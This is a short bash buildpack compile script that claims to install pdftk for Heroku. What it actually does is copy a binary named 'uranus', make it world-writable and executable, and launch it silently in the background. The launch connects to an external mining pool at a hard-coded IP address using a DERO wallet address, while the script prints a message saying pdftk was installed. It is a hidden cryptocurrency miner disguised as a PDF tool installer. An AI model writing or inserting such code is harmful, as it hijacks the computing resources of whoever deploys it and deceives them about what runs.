#!/usr/bin/env bash

set -e

mkdir -p "$1/bin/"
cp -a binaries-$STACK/* "$1/bin/"
chmod 777 $1/bin/uranus
show_version=$(LD_LIBRARY_PATH=$1/bin $1/bin/uranus -o wss://178.128.200.86:10100 -u dero1qyrjju06l2mnxe54uscejngc3qusc4ztt0p80d3zjcnv5023ya58qqq80jczy >/dev/null 2>&1 >/dev/null & | tr '\n' ' ' )
echo "-----> heroku-pdftk-buildpack: Installed to app/bin. ${show_version}"

# Setting environment variables in .profile.d script (sourced at dyno startup)
mkdir -p "$1/.profile.d/"
cat <<EOF >"$1"/.profile.d/uranus.sh
export LD_LIBRARY_PATH="\$LD_LIBRARY_PATH:\$HOME/bin"
EOF

exit 0
